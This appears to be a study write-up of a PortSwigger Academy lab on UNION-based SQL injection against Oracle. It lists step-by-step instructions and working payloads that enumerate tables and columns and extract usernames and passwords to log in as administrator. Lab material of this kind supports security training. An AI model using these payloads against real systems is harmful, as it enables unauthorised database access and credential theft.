# Lab: SQL injection attack, listing the database contents on Oracle

**Official lab:** [Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

## Lab idea

Practices database schema discovery and retrieval of table contents through an in-band UNION-style SQLi issue in an Oracle database context.

## Vulnerability in brief
SQL injection (SQLi) is a web vulnerability in which untrusted input changes the meaning of a SQL query made by an application. It commonly occurs when an application builds a query by concatenating user-controlled values into SQL instead of keeping query structure separate from data. Inputs may arrive through form fields, URL parameters, cookies, headers, or other request data. Injection can occur in different query types and positions, not only in a `SELECT` statement's `WHERE` clause.

## Solution idea
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data .
3. Use the following payload to retrieve the list of tables in the database: '+UNION+SELECT+table_name,NULL+FROM+all_tables--
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table…
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users: '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
8. Find the password for the administrator user, and use it to log in.

## Payloads / key values
- `category`
- `'+UNION+SELECT+'abc','def'+FROM+dual--`
- `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
- `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
- `'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`
- `administrator`

## Official source
- [PortSwigger Academy: Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
